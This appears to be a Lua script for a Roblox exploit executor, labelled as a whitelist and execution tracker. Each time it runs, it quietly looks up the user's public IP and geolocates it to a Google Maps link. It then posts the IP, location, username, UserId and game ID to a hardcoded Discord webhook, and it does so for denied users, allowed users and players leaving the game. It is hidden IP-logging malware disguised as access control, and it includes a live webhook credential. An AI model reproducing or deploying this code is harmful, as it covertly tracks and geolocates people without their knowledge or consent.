--------------------------------------------------
-- ðŸ”’ WHITELIST + ðŸ“Š EXECUTION TRACKER (COMBINED)
--------------------------------------------------
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- Executor HTTP
local http = http_request or request or syn.request
if not http then
    warn("Executor does not support HTTP")
    return
end

-- Function to get the user's public IP address
local function getIpAddress()
    local success, result = pcall(function()
        return http({Url = "https://api.ipify.org?format=json"}).Body
    end)
    if success then
        local jsonResult = HttpService:JSONDecode(result)
        return jsonResult.ip
    else
        return "Unknown"
    end
end

-- Function to get a Google Maps link for an IP address
local function getIpMapLink(ipAddress)
    local apiUrl = "http://ip-api.com/json/" .. ipAddress
    local success, response = pcall(function()
        return http({Url = apiUrl}).Body
    end)
    if not success then
        warn("Failed to get IP location data.")
        return "https://www.google.com/maps"
    end
    local data = HttpService:JSONDecode(response)
    if data.status == "success" and data.lat and data.lon then
        local lat = data.lat
        local lon = data.lon
        return "https://www.google.com/maps?q=" .. lat .. "," .. lon
    else
        warn("Could not find location for IP: " .. ipAddress)
        return "https://www.google.com/maps"
    end
end

-- Get IP and Map Link at the start
local userIp = getIpAddress()
local mapLink = getIpMapLink(userIp)

--------------------------------------------------
-- ðŸ”‘ WEBHOOKS
--------------------------------------------------
local ALLOWED_WEBHOOK = "https://discord.com/api/webhooks/1451337275102466048/Wjxhi3ha2MAJ1GeO73CAjdJnwbuGan9XdEmuJZ0YEbocwcSmiOyXeybATLGek6xpzIHH"
local DENIED_WEBHOOK = "https://discord.com/api/webhooks/1451337275102466048/Wjxhi3ha2MAJ1GeO73CAjdJnwbuGan9XdEmuJZ0YEbocwcSmiOyXeybATLGek6xpzIHH"
local LEFT_GAME_WEBHOOK = "https://discord.com/api/webhooks/1451337275102466048/Wjxhi3ha2MAJ1GeO73CAjdJnwbuGan9XdEmuJZ0YEbocwcSmiOyXeybATLGek6xpzIHH"

--------------------------------------------------
-- âœ… USERID WHITELIST
--------------------------------------------------
local Whitelist = {
    [1701156929] = true, -- goku_agma
    [8695533338] = true, -- iamnotldsteam  <-- excluded from whitelist/logging
    [2439933624] = true, -- Diego_Awan10
    [5799411179] = true, -- H_Hclan
}

local excludedUserId = 86955337338 -- iamnotldsteam

--------------------------------------------------
-- âŒ NOT WHITELISTED â†’ SEND + STOP
--------------------------------------------------
if LocalPlayer.UserId ~= excludedUserId and not Whitelist[LocalPlayer.UserId] then
    local payload = {
        content = "**âŒ Script Blocked**\n" ..
                  "ðŸ‘¤ User: " .. LocalPlayer.Name .. "\n" ..
                  "ðŸ†” UserId: " .. LocalPlayer.UserId .. "\n" ..
                  "ðŸŒ IP: " .. userIp .. "\n" ..
                  "ðŸ—ºï¸ Map: " .. mapLink .. "\n" ..
                  "ðŸŽ® PlaceId: " .. game.PlaceId
    }
    http({
        Url = DENIED_WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
    warn("âŒ You are not whitelisted to use this script.")
    return
end

--------------------------------------------------
-- ðŸ“ USAGE TRACKING (LOCAL FILE)
--------------------------------------------------
if LocalPlayer.UserId ~= excludedUserId then
    local FILE_NAME = "script_usage.json"
    local UsageData = {}

    if isfile(FILE_NAME) then
        local success, data = pcall(function()
            return HttpService:JSONDecode(readfile(FILE_NAME))
        end)
        if success and typeof(data) == "table" then
            UsageData = data
        end
    end

    local uid = tostring(LocalPlayer.UserId)
    UsageData[uid] = (UsageData[uid] or 0) + 1
    writefile(FILE_NAME, HttpService:JSONEncode(UsageData))

    --------------------------------------------------
    -- ðŸ“¤ SEND ALLOWED LOG
    --------------------------------------------------
    local payload = {
        content = "**âœ… Script Executed**\n" ..
                  "ðŸ‘¤ User: " .. LocalPlayer.Name .. "\n" ..
                  "ðŸ†” UserId: " .. LocalPlayer.UserId .. "\n" ..
                  "ðŸŒ IP: " .. userIp .. "\n" ..
                  "ðŸ—ºï¸ Map: " .. mapLink .. "\n" ..
                  "ðŸŽ® PlaceId: " .. game.PlaceId .. "\n" ..
                  "ðŸ“Š Total Uses: " .. UsageData[uid]
    }
    http({
        Url = ALLOWED_WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

--------------------------------------------------
-- ðŸšª TRACK PLAYER LEAVING
--------------------------------------------------
Players.PlayerRemoving:Connect(function(player)
    if player.UserId ~= excludedUserId and player == LocalPlayer then
        local payload_leave = {
            content = "**âš ï¸ Player Left**\n" ..
                      "ðŸ‘¤ User: " .. player.Name .. "\n" ..
                      "ðŸ†” UserId: " .. player.UserId .. "\n" ..
                      "ðŸŒ IP: " .. userIp .. "\n" ..
                      "ðŸ—ºï¸ Map: " .. mapLink .. "\n" ..
                      "ðŸŽ® PlaceId: " .. game.PlaceId
        }
        http({
            Url = LEFT_GAME_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload_leave)
        })
    end
end)

--------------------------------------------------
-- SCRIPT CONTINUES
--------------------------------------------------
print("âœ… Script loaded")





